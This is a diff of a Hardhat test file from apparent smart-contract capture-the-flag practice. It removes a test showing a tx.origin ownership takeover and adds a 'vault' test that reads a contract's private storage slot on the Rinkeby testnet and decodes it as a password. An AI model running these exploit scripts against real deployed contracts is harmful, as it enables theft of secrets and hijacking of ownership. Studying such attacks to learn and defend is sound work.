@@ -3,33 +3,26 @@ const { ethers } = require("hardhat");
 
 let greeterContract;
 let callGreeterContract;
-const provider = ethers.getDefaultProvider()
+const provider = ethers.getDefaultProvider('rinkeby')
 
 
-it('deploy', async () => {
+const convertHex = (_hex) => {
+  const hex = _hex.toString();
+  let str = '';
+  for(let i=0; i<hex.length; i+=2 ) {
+    str += String.fromCharCode(parseInt(hex.substr(i,2), 16));
+  }
+  return str
+}
 
-  const Contract = await ethers.getContractFactory('Greeter');
-  greeterContract = await Contract.deploy();
-  await greeterContract.deployed();
-  console.log('Address', greeterContract.address);
+it('vault', async () => {
+  const contractAddr = '0x239eB11241e8d1DAF546de8f5f7d451BBe2FdA88';
+  const pass = await provider.getStorageAt(contractAddr, 1);
+  console.log('Password ===>>>',pass)
 
-  const ContractCallGreeter = await ethers.getContractFactory('CallGreeter');
-  callGreeterContract = await ContractCallGreeter.deploy();
-  await callGreeterContract.deployed();
-
-  console.log('Call greeter contract', callGreeterContract.address);
-
+  const res = convertHex(pass)
+  console.log('res', res)
 })
 
 
-it('tx-origin', async () => {
-  const owner = await greeterContract.owner();
-  console.log('Owner ===>>', owner);
-
-  const [addr1, addr2] = await ethers.getSigners();
-  console.log('address',addr2.address)
-  await callGreeterContract.callGreeter(greeterContract.address, addr2.address);
-
-  const newOwner = await greeterContract.owner();
-  console.log('Owner ===>>', newOwner);
-})
+// addr: 0x239eB11241e8d1DAF546de8f5f7d451BBe2FdA88
